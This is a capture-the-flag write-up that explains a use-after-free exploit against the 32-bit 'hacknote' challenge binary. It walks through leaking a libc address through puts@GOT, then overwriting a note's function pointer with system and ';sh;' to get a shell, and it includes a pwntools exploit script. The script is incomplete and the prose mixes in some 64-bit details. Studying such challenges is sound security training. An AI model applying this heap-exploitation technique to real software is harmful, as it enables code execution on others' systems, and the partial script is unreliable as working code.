This is a more difficult Use After Free challenge than the one we have previously exploited on
pwnable.kr. This challenge is called hacknote, and you can download this from either pwnable.tw
or from the HITCON-Training repository on angelboy's github.

It involves abusing a uaf twice, first to achieve a leak within libc to calculate the address of system
within libc, and next to overwrite the object's print method with system and pass ";sh;" as a parameter
to it.

I wont be going into much details on the internals of ptmalloc as much as i usually do, i will simply
just say what happens without giving much reason on WHY that happens.

```c
struct note {
    void (*putsNoteFn)();
    char *content;
}
```

this is what the note struct will look like, the first member will be 4 bytes in size, as it will hold
a pointer to an address space that will be dereferenced and executed. The reason that it is 4 bytes is
due to the fact that this is an x86 binary, which means each address space is 4 bytes large.

The second member is the content, this is a char pointer which means there is no statically set
limit for its size, but it will also be 4 bytes large. It will act as a pointer, which means that the
actual value being stored on the object/struct is only 4 bytes large as well.

Lets check the context in which this object is being used:

```c
void print_note_content(struct note *this){
	puts(this->content);
}

notelist[i]->printnote = print_note_content;

notelist[i]->content = (char *)malloc(size);
```

okay, so we have our print_note_content function, which will know where our content pointer is within
memory. This is important as i was stuck on this for a while trying to understand why a simple
ret2plt would not work.

It is still theoretically possible to pop rdi the GOT entry of puts@GOT, and pass it to puts@PLT, but
i would have to try that out later since im not actually sure. okay, so i will attempt to help you
visualize the leak first:

first we allocate 2 users, of chunk size 28. We know that the minimum chunk size for a 64 bit binary
will be 24 right? But this is a 32 bit binary, which means the useable size of a chunk returned will
be 12. We dont want this, we want 28 byte chunks, so lets pass "13" to our creation size.

Malloc will pad it with 16 bytes, so each allocation size within x86's usable chunk sizes will be
12, 28, 44, and so forth.

here is the layout of the heap after we allocate 2 users of 28 bytes in size, and named AAAA/BBBB

```
       notelist[0]                               notelist[1]
          |                                          |
          V                                          V
[metadata] [[printnote][content_pointer]] [metadata] [[printnote][content_pointer]]
                |               |                          |                |
                V               V                          V                V
         print_note_content(); char* content="AAAA";  print_note_content(); char* content="BBBB";
```

okay, let free these two to create 2 dangling pointers due to the fact that the pointers had not been
nulled out, which gives us a uaf bug. Lets then allocate a user 3:

```
  +---------------------------------------------------------------+
  |                                                               |
  |    notelist[0]                               notelist[1]  notelist[2]
  +-------|                                          |
          V                                          V
[metadata] [[printnote][content_pointer]]
                |               |
                V               V
        print_note_content(); char* content="AAAA";
```

this part is important, we can INTERACT with this object by accessing the functions through notelists
right? Now that since notelist[2] is POINTING to the notelist[0], we can DIRECTLY overwrite this
object on the heap.

This is different than interacting with the object in the sense that these are pointers remember?
When we add and print notes, it is within a controlled environment, within a controlled object. But
now, if we were to allocate notelist[2] with the same chunk that notelist[0] points to, we can directly
interact with what gets called/interacted with.

so we can use this to leak the address of any static imported symbol we want, as long as it has already
been called. Normally you would want to use something like __libc_start_main, but i just went with puts
here since that its much shorter and less of a hassle to type.

okay, so we create an object/note with a size of 8 bytes, and the contents of our print_note_content
function, and whichever GOT entry we want to leak. I am not going to be explaining how this gets
resolved, and printed out, but here is a nice video for you if you want to understand it:

okay, we have leaked and calculated the base address of libc. How do we gain code execution?

the exact same thing, just over again. Free user 3, which is on index 2, and overwrite the content
pointer with system, and ";sh;", to ignore the junk bytes or env variables when executing a shell.

boom, here is the exploit script:

```py
#!/usr/bin/env python3

if len(argv)>1 and argv[1]=="-r": # adjust libc based on local or rem
    libc=ELF("./libc_32.so.6",checksec=False)
    p=remote("chall.pwnable.tw", 10102)
else:
    p=binary.process()
    libc=ELF("./libc.so.6",checksec=False)
# user 1

s("13",r=" :")
s("AAAA",r=" :")

s("1",r=" :")

# user 3 - ptr 0 may interact
s("1",r="choice :")
s("8",r=" :")
pause()
# overwrite old object, address and contents/parameter
p.sendline(pack.pk32(0x0804862B)+pack.pk32(binary.got['puts'])) # control ip
#p.sendline(pack.pk32(binary.plt['puts'])+pack.pk32(binary.got['puts'])) # control ip, ret2plt
#pause()
s("3",r="choice :")
s("0",r=" :")

p.recvuntil("Index :")
# will print all contents of note, we only want first 4 bytes; leaked libc address
base = int.from_bytes(p.recv(4),"little")-libc.symbols['puts']
context.log_level='warning'
log.log("Leaked base address of libc: %s"%hex(base))
system=libc.symbols['system']+base
log.log("Leaked address of system: %s"%hex(system))
# we do not need to leak /bin/sh, we have ability to write memory
pause()
# free user 3(index 2)
s("2",r=" :")
s("2",r=" :")
# overwrite again with system with parameter ;sh;, to ignore junk
s("1",r=" :")
s("8",r=" :")
p.sendline(pack.pk32(system) + b";sh;")

s("3",r=" :")
s("0",r=" :")
p.interactive()
```
